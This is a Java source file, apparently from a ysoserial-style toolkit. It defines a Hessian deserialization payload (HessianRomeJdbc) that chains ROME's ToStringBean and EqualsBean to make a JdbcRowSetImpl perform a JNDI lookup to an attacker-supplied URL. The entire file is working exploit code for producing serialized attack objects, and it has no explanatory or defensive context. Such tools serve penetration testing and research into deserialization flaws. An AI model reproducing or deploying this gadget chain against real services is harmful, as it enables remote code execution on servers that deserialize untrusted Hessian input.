package ysoserial.payloads;

import com.caucho.hessian.io.HessianOutput;
import com.sun.rowset.JdbcRowSetImpl;
import com.sun.syndication.feed.impl.EqualsBean;
import com.sun.syndication.feed.impl.ToStringBean;
import org.apache.commons.collections4.functors.ConstantTransformer;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

import java.io.FileOutputStream;
import java.util.HashMap;

@Dependencies({"rome:rome:1.0","com.caucho:hessian:4.0.38"})
@Authors({ Authors.F4NX1NG })
public class HessianRomeJdbc implements ObjectPayload<Object>{
    public Object getObject(final String url) throws Exception {
        JdbcRowSetImpl jdbcRowset = new JdbcRowSetImpl();
        jdbcRowset.setDataSourceName(url);

        ToStringBean toStringBean = new ToStringBean(JdbcRowSetImpl.class, new ConstantTransformer(1));
        EqualsBean equalsBean = new EqualsBean(ToStringBean.class, toStringBean);

        HashMap<Object, Object> hashMap = new HashMap();
        hashMap.put(equalsBean, "123");
        Reflections.setFieldValue(toStringBean, "_obj", jdbcRowset);

        return hashMap;
    }

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(HessianRomeJdbc.class, args);
    }
}
